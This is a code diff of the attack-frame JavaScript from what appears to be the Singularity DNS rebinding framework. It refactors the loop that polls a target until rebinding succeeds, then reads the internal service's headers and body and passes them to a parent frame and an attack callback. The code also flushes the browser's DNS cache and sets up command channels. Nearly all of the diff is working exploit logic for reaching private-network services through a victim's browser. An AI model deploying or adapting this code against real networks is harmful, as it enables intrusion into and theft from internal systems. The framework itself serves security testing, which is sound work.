@@ -1,67 +1,133 @@
-var timer;
-var frame;
-var sessionid;
-var flushdns;
-var xhr;
-var interval = 60000;
+const Rebinder = () => {
+    let headers = null;
+    let body = null;
 
-function initCommsWithParentFrame() {
-    window.addEventListener("message", function (e) {
-        console.log("attack frame", window.location.hostname, "received message", e.data.cmd);
+    let url = null;
+    let rebindingDoneFn = null;
 
-        switch (e.data.cmd) {
-            case "interval":
-                interval = parseInt(e.data.param) * 1000;
-                break;
-            case "indextoken":
-                indextoken = e.data.param;
-                break;
-            case "flushdns":
-                if (e.data.param.flushDns === true) {
-                    console.log("Flushing Browser DNS cache.");
-                    flushBrowserDnsCache(e.data.param.hostname);
+    let timer = null;
+    var frame = null;
+    var sessionid = null;
+    var flushdns = null;
+    let xhr = null;
+    let interval = 60000;
+
+    function initCommsWithParentFrame() {
+        window.addEventListener("message", function (e) {
+            console.log("attack frame", window.location.hostname, "received message", e.data.cmd);
+
+            switch (e.data.cmd) {
+                case "interval":
+                    interval = parseInt(e.data.param) * 1000;
+                    break;
+                case "indextoken":
+                    indextoken = e.data.param;
+                    break;
+                case "flushdns":
+                    if (e.data.param.flushDns === true) {
+                        console.log("Flushing Browser DNS cache.");
+                        flushBrowserDnsCache(e.data.param.hostname);
+                    }
+                    break;
+                case "stop":
+                    clearInterval(timer);
+                    break;
+                case "start":
+                    timer = setInterval(function () {run()}, interval);
+                    console.log("frame", window.location.hostname, "waiting", interval,
+                        "milliseconds for dns update");
+                    break;
+            }
+        });
+    };
+
+    function init(myUrl, myRebindingDoneFn) {
+        url = myUrl;
+        rebindingDoneFn = myRebindingDoneFn;
+        initCommsWithParentFrame();
+        window.parent.postMessage({
+            status: "start"
+        }, "*");
+    };
+
+    function run() {
+        fetch(url, {
+                credentials: 'omit',
+            })
+            .then(function (r) {
+
+                if (r.headers.get('X-Singularity-Of-Origin') === 't') {
+                    throw new Error('hasSingularityHeader');
                 }
-                break;
-            case "stop":
-                clearInterval(timer);
-                break;
-            case "start":
-                timer = setInterval(attack, interval);
-                console.log("frame", window.location.hostname, "waiting", interval,
-                    "milliseconds for dns update");
-                break;
-        }
-    });
-}
 
-// Notify the parent that attack frame is loaded.
-function begin() {
-    window.parent.postMessage({
-        status: "start"
-    }, "*");
-}
+                headers = r.headers;
 
-// checks if Response is '200' and return Promise Body.text()
-// otherwise throw an error with errorString
-function responseOKOrFail(errorString) {
-    return function (r) {
-        if (r.ok) {
-            console.log("attack frame ", window.location.hostname, " received a response");
-            return r.text()
-        } else {
-            throw new Error(errorString)
-        }
+                if (r.headers.get('www-authenticate') !== null) {
+                    return new Promise(function (resolve, reject) {
+                        reject(new Error('requiresHttpAuthentication'));
+                    });
+                };
+
+                return r.text();
+
+            })
+            .then(function (responseData) { // we successfully received the server response
+                if (responseData.length > 0) {
+                    body = responseData;
+                    clearInterval(timer); // stop the attack timer
+                    // Report success to parent frame
+                    window.parent.postMessage({
+                        status: "success",
+                        response: body
+                    }, "*");
+                    // Terminate the attack
+                    const rebindingStatusEl = document.getElementById('rebindingstatus');
+                    rebindingStatusEl.innerText = `DNS rebinding successful!`;
+                    rebindingDoneFn(headers, body);
+                } else {
+                    // Browser is probably confused about abrupt connection drop. 
+                    // Let's wait for the next iteration.
+                    throw new Error('invalidResponseLength');
+                }
+            })
+            .catch(function (error) {
+                if (error instanceof TypeError) { // We cannot establish an HTTP connection
+                    console.log("frame " + window.location.hostname + " could not load");
+                    window.parent.postMessage({
+                        status: "error",
+                    }, "*");
+                } else if (error.message == 'hasSingularityHeader' ||
+                    error.message == 'invalidResponseLength') {
+                    console.log('DNS rebinding did not happen yet')
+                } else if (error.message == 'requiresHttpAuthentication') {
+                    console.log('This resource requires HTTP Authentication.');
+                    window.parent.postMessage({
+                        status: "requiresHttpAuthentication",
+                    }, "*");
+                    rebindingDoneFn(headers, null);
+                } else { // We did not handle something
+                    console.log('Unhandled error: ' + error);
+                    window.parent.postMessage({
+                        status: "error",
+                    }, "*");
+                }
+            });
+    };
+
+    return {
+        init,
+        run,
+        
     }
 }
 
-// terminates attack and inform parent frame
-function attackSuccess(message) {
-    console.log(message);
-    clearInterval(timer); //stop attack
-    window.parent.postMessage({
-        status: "success",
-        response: message
-    }, "*");
+function begin(url) {
+    const hostnameEl = document.getElementById('hostname');
+    const arr = window.location.hostname.split('-');
+    const port = document.location.port ? document.location.port : "80";
+    hostnameEl.innerText = `target: ${arr[2]}:${port}, session: ${arr[3]}, strategy: ${arr[4]}`;
+    r = Rebinder();
+    r.init(url, attack);
 }
 
 // Request target to establish a websocket to Singularity server and wait for commands
@@ -287,4 +353,10 @@ function flushBrowserDnsCache(hostname) {
     worker.postMessage(params);
 }
 
-initCommsWithParentFrame();
+function httpHeaderstoText(headers) {
+    out = "";
+    for (let pair of headers.entries()) {
+        out = (`${out}\n${pair[0]}: ${pair[1]}`);
+    };
+    return out;
+}
